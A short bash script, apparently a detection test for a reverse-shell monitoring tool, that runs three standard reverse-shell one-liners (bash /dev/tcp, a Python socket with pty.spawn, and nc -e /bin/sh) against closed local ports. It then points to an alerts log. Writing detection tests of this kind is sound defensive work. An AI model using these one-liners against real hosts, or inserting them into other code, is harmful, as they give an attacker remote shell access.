#!/bin/bash
# WARNING: Run only in isolated VM/container. This script triggers REAL reverse shell behaviors.
# It does NOT establish actual C2 connection - uses 127.0.0.1 on blocked port.

echo "[*] Scenario 1: bash /dev/tcp (will fail to connect - detection test only)"
timeout 2 bash -c 'bash -i >& /dev/tcp/127.0.0.1/9999 0>&1' 2>/dev/null || true
sleep 1

echo "[*] Scenario 2: python socket"
timeout 2 python3 -c "import socket,os,pty;s=socket.socket();s.connect(('127.0.0.1',9998));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn('/bin/sh')" 2>/dev/null || true
sleep 1

echo "[*] Scenario 3: nc"
timeout 2 nc 127.0.0.1 9997 -e /bin/sh 2>/dev/null || true

echo "[+] Simulation complete. Check /var/log/rsbp/alerts.jsonl for detections."
